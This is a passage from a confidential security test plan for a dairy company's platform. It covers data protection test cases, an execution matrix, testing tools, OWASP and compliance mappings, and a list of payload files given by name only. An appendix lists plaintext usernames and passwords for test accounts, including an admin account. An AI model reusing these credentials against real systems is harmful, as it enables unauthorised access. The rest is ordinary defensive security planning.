- Privacy policy review
- Data flow mapping

**Attack Scenario/Steps:**

1. Identify all PII collected:
   - Name, email, phone
   - Address, location data
   - Payment information
   - Order history
   - Device information

2. Verify consent mechanisms
3. Check data retention policies
4. Verify right to deletion

**Expected Result:**
- PII collected only with consent
- Data minimization practiced
- Retention policies enforced
- Right to access and delete
- GDPR/CCPA compliance
- Data processing agreements in place

---

### SEC-DATA-005: Data Backup Security

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-DATA-005 |
| **OWASP Reference** | OWASP Backup Security |
| **Test Title** | Backup Encryption and Access Control |
| **Risk Level** | Medium |

**Prerequisites:**
- Backup system access
- Backup restoration process

**Attack Scenario/Steps:**

1. Verify backup encryption
2. Check backup access controls
3. Test backup restoration
4. Verify offsite backup security

**Expected Result:**
- All backups encrypted at rest
- Backup access restricted
- Encryption keys separate from backups
- Backup integrity verification
- Secure offsite storage

---

### SEC-DATA-006: Data Transmission Security

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-DATA-006 |
| **OWASP Reference** | OWASP ASVS - V9 Communication |
| **Test Title** | Data in Transit Protection |
| **Risk Level** | Critical |

**Prerequisites:**
- Network traffic capture capability
- Various client types

**Attack Scenario/Steps:**

1. Capture traffic with Wireshark
2. Verify all traffic encrypted
3. Check for sensitive data in:
   - Query parameters
   - Headers
   - Body (unencrypted)
4. Test WebSocket security

**Expected Result:**
- All traffic over HTTPS
- No sensitive data in URL parameters
- Secure WebSocket (WSS)
- Certificate validation enforced
- No mixed content (HTTP resources on HTTPS page)


## Test Execution Summary

### Test Case Summary by Category

| Category | Total | Critical | High | Medium | Low |
|----------|-------|----------|------|--------|-----|
| Authentication & Authorization | 10 | 4 | 4 | 2 | 0 |
| Input Validation & Injection | 10 | 6 | 3 | 1 | 0 |
| Session Management | 8 | 3 | 3 | 2 | 0 |
| Business Logic | 8 | 3 | 3 | 2 | 0 |
| API Security | 8 | 4 | 3 | 1 | 0 |
| Mobile Security | 6 | 2 | 2 | 2 | 0 |
| Data Protection | 6 | 3 | 2 | 1 | 0 |
| **TOTAL** | **56** | **25** | **20** | **11** | **0** |

### Test Execution Matrix

| Test ID | Category | Priority | Execution Status | Result | Tester | Date |
|---------|----------|----------|------------------|--------|--------|------|
| SEC-AUTH-001 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-002 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-003 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-004 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-005 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-006 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-007 | Authentication | P2 | Not Started | - | - | - |
| SEC-AUTH-008 | Authentication | P1 | Not Started | - | - | - |
| SEC-AUTH-009 | Authentication | P2 | Not Started | - | - | - |
| SEC-AUTH-010 | Authentication | P2 | Not Started | - | - | - |
| SEC-INJ-001 | Injection | P1 | Not Started | - | - | - |
| SEC-INJ-002 | Injection | P1 | Not Started | - | - | - |
| SEC-INJ-003 | Injection | P1 | Not Started | - | - | - |
| SEC-INJ-004 | Injection | P2 | Not Started | - | - | - |
| SEC-INJ-005 | Injection | P2 | Not Started | - | - | - |
| SEC-INJ-006 | Injection | P1 | Not Started | - | - | - |
| SEC-INJ-007 | Injection | P2 | Not Started | - | - | - |
| SEC-INJ-008 | Injection | P1 | Not Started | - | - | - |
| SEC-INJ-009 | Injection | P2 | Not Started | - | - | - |
| SEC-INJ-010 | Injection | P1 | Not Started | - | - | - |
| SEC-SES-001 | Session | P2 | Not Started | - | - | - |
| SEC-SES-002 | Session | P1 | Not Started | - | - | - |
| SEC-SES-003 | Session | P2 | Not Started | - | - | - |
| SEC-SES-004 | Session | P2 | Not Started | - | - | - |
| SEC-SES-005 | Session | P3 | Not Started | - | - | - |
| SEC-SES-006 | Session | P2 | Not Started | - | - | - |
| SEC-SES-007 | Session | P3 | Not Started | - | - | - |
| SEC-SES-008 | Session | P3 | Not Started | - | - | - |
| SEC-BL-001 | Business Logic | P1 | Not Started | - | - | - |
| SEC-BL-002 | Business Logic | P2 | Not Started | - | - | - |
| SEC-BL-003 | Business Logic | P1 | Not Started | - | - | - |
| SEC-BL-004 | Business Logic | P2 | Not Started | - | - | - |
| SEC-BL-005 | Business Logic | P2 | Not Started | - | - | - |
| SEC-BL-006 | Business Logic | P2 | Not Started | - | - | - |
| SEC-BL-007 | Business Logic | P2 | Not Started | - | - | - |
| SEC-BL-008 | Business Logic | P3 | Not Started | - | - | - |
| SEC-API-001 | API Security | P2 | Not Started | - | - | - |
| SEC-API-002 | API Security | P1 | Not Started | - | - | - |
| SEC-API-003 | API Security | P1 | Not Started | - | - | - |
| SEC-API-004 | API Security | P2 | Not Started | - | - | - |
| SEC-API-005 | API Security | P3 | Not Started | - | - | - |
| SEC-API-006 | API Security | P2 | Not Started | - | - | - |
| SEC-API-007 | API Security | P2 | Not Started | - | - | - |
| SEC-API-008 | API Security | P2 | Not Started | - | - | - |
| SEC-MOB-001 | Mobile | P2 | Not Started | - | - | - |
| SEC-MOB-002 | Mobile | P1 | Not Started | - | - | - |
| SEC-MOB-003 | Mobile | P1 | Not Started | - | - | - |
| SEC-MOB-004 | Mobile | P3 | Not Started | - | - | - |
| SEC-MOB-005 | Mobile | P3 | Not Started | - | - | - |
| SEC-MOB-006 | Mobile | P3 | Not Started | - | - | - |
| SEC-DATA-001 | Data Protection | P1 | Not Started | - | - | - |
| SEC-DATA-002 | Data Protection | P2 | Not Started | - | - | - |
| SEC-DATA-003 | Data Protection | P2 | Not Started | - | - | - |
| SEC-DATA-004 | Data Protection | P2 | Not Started | - | - | - |
| SEC-DATA-005 | Data Protection | P3 | Not Started | - | - | - |
| SEC-DATA-006 | Data Protection | P1 | Not Started | - | - | - |

### Risk Assessment Matrix

| Likelihood \ Impact | Critical | High | Medium | Low |
|---------------------|----------|------|--------|-----|
| Very High | 25 | 15 | 5 | 2 |
| High | 10 | 20 | 8 | 3 |
| Medium | 5 | 10 | 15 | 5 |
| Low | 2 | 5 | 10 | 8 |

---

## Appendices

### Appendix A: Testing Tools Reference

| Tool | Purpose | Version |
|------|---------|---------|
| Burp Suite Professional | Web Proxy, Scanner, Intruder | Latest |
| OWASP ZAP | Open Source Web Scanner | 2.14+ |
| SQLMap | SQL Injection Testing | 1.7+ |
| Nmap | Network Scanning | 7.94+ |
| Metasploit | Exploitation Framework | 6.3+ |
| MobSF | Mobile Security Framework | Latest |
| Frida | Dynamic Instrumentation | 16+ |
| Postman | API Testing | Latest |
| SonarQube | Static Code Analysis | 10+ |
| Nessus | Vulnerability Scanner | 10+ |
| XSStrike | XSS Detection | Latest |
| Commix | Command Injection | Latest |
| JWT_Tool | JWT Security Testing | Latest |
| TestSSL.sh | SSL/TLS Testing | Latest |
| Wireshark | Network Protocol Analysis | 4+ |

### Appendix B: OWASP Mapping

| Test Case Category | OWASP Top 10 2021 | OWASP ASVS 4.0 |
|--------------------|-------------------|----------------|
| Authentication | A07 | V2 |
| Authorization | A01 | V4 |
| Injection | A03 | V5 |
| Session Management | A07 | V3 |
| Cryptography | - | V6 |
| Error Handling | - | V7 |
| Data Protection | A05 | V8 |
| Communication | - | V9 |
| Malicious Code | - | V10 |
| Business Logic | - | V11 |
| File Upload | - | V12 |
| API Security | A01, A09 | V13, V14 |

### Appendix C: Compliance Mapping

| Test Case | PCI DSS | ISO 27001 | GDPR | HIPAA |
|-----------|---------|-----------|------|-------|
| SEC-AUTH-001 | 8.2.3 | A.9.4.2 | Art.32 | 164.312(a) |
| SEC-AUTH-003 | 8.2.3 | A.9.4.3 | Art.32 | 164.312(a) |
| SEC-INJ-001 | 6.5.1 | A.14.2.5 | Art.32 | 164.312(a) |
| SEC-SES-004 | 4.1 | A.13.2.1 | Art.32 | 164.312(e) |
| SEC-DATA-001 | 3.4 | A.10.1.2 | Art.32 | 164.312(a) |
| SEC-DATA-002 | 4.1 | A.13.2.1 | Art.32 | 164.312(e) |
| SEC-DATA-003 | 3.4 | A.12.4.1 | Art.32 | 164.312(b) |
| SEC-DATA-004 | 3.4 | A.18.1.3 | Art.5, Art.32 | 164.502 |
| SEC-API-002 | 6.5.10 | A.9.4.2 | Art.32 | 164.312(a) |
| SEC-API-003 | 6.5.10 | A.9.4.2 | Art.32 | 164.312(a) |

### Appendix D: Test Data

#### Sample User Accounts

| Role | Username | Password | Notes |
|------|----------|----------|-------|
| Admin | admin@smartdairy.com | ComplexAdmin123! | Full privileges |
| Customer | customer1@example.com | CustomerPass123! | Standard user |
| Customer | customer2@example.com | CustomerPass456! | For horizontal testing |
| Farmer | farmer@smartdairy.com | FarmerPass123! | Supplier account |
| API User | api_user@smartdairy.com | ApiKey123! | API access only |
| Delivery | delivery@smartdairy.com | DeliveryPass123! | Delivery partner |

#### Sample Attack Payloads Repository

Location: `/testing/payloads/`

| File | Description | Count |
|------|-------------|-------|
| `sqli_payloads.txt` | SQL injection payloads | 100+ |
| `xss_payloads.txt` | XSS payloads | 200+ |
| `lfi_payloads.txt` | Local File Inclusion | 50+ |
| `command_injection.txt` | Command injection | 50+ |
| `xxe_payloads.xml` | XXE attack templates | 20+ |
| `ssrf_payloads.txt` | SSRF payloads | 30+ |
| `ldap_injection.txt` | LDAP injection | 25+ |
| `nosql_injection.txt` | NoSQL injection | 40+ |
| `jwt_payloads.txt` | JWT manipulation | 15+ |
| `path_traversal.txt` | Path traversal | 50+ |

### Appendix E: Escalation Procedures

| Severity | Initial Response | Fix Timeline | Escalation |
|----------|------------------|--------------|------------|
| Critical | Immediate | 24 hours | CISO + Dev Lead |
| High | 4 hours | 72 hours | Security Lead + PM |
| Medium | 24 hours | 2 weeks | QA Lead |
| Low | 48 hours | Next release | QA Engineer |

### Appendix F: Security Testing Checklist

#### Pre-Testing Checklist
- [ ] Test environment isolated from production
- [ ] Test data anonymized
- [ ] Legal approval obtained for penetration testing
- [ ] Stakeholders notified of testing window
- [ ] Rollback procedures in place
- [ ] Monitoring and alerting configured
- [ ] Incident response team on standby

#### During Testing
- [ ] All tests documented
- [ ] Screenshots captured for evidence
- [ ] Network traffic logged
- [ ] System performance monitored
- [ ] No production data accessed

#### Post-Testing
- [ ] Results reviewed with security team
- [ ] Vulnerabilities prioritized
- [ ] Remediation plan created
- [ ] Retesting scheduled
- [ ] Report delivered to stakeholders

### Appendix G: Reference Standards

| Standard | Description | Relevance |
|----------|-------------|-----------|
| OWASP Top 10 2021 | Top 10 Web Application Security Risks | Primary |
| OWASP ASVS 4.0 | Application Security Verification Standard | Primary |
| OWASP Testing Guide 4.2 | Web Application Testing Guide | Primary |
| OWASP API Security Top 10 | API Security Risks | Primary |
| OWASP MASVS | Mobile Application Security | Primary |
| NIST SP 800-53 | Security and Privacy Controls | Secondary |
| ISO 27001 | Information Security Management | Secondary |
| PCI DSS 4.0 | Payment Card Industry Standards | For payment features |
| GDPR | Data Protection Regulation | For EU users |
| HIPAA | Health Information Privacy | If applicable |

---

## Document Approval

| Role | Name | Signature | Date |
|------|------|-----------|------|
| Author | Security QA Engineer | ___________________ | ___________ |
| Reviewer | Security Lead | ___________________ | ___________ |
| Approver | QA Lead | ___________________ | ___________ |
| Final Approval | CISO / CTO | ___________________ | ___________ |

---

## Distribution List

| Role | Name | Department |
|------|------|------------|
| QA Lead | [Name] | Quality Assurance |
| Security Lead | [Name] | Information Security |
| Dev Lead | [Name] | Engineering |
| Product Manager | [Name] | Product |
| CISO | [Name] | Information Security |
| Compliance Officer | [Name] | Legal/Compliance |

---

*Document ID: G-017 | Version: 1.0 | Date: January 31, 2026*

*Classification: Internal - Confidential*

*Smart Dairy Ltd. - All Rights Reserved*

*This document contains proprietary and confidential information. Unauthorized distribution or reproduction is strictly prohibited.*
